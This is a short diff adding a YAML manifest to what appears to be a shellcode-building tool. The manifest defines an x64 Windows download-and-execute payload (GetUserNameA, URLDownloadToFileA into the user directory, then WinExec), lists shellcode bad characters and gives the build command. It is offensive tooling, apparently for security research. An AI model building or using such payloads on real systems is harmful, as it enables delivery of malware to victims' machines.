@@ -1,0 +1,8 @@
+# URLDownloadToFileA to user directory + WinExec - x64
+# IR workflow: GetUserNameA -> URLDownloadToFileA -> WinExec -> exit
+#
+# Build:
+#   uv run python -c "from emitrion.build_x64 import build_x64; r = build_x64('emitrion/manifests/win-x64/url_download_to_userdir_x64.yaml', assemble=False); print(r.asm[:200])"
+arch: x64
+template: ir_url_download_to_userdir
+badchars: ["00", "0A", "0D"]
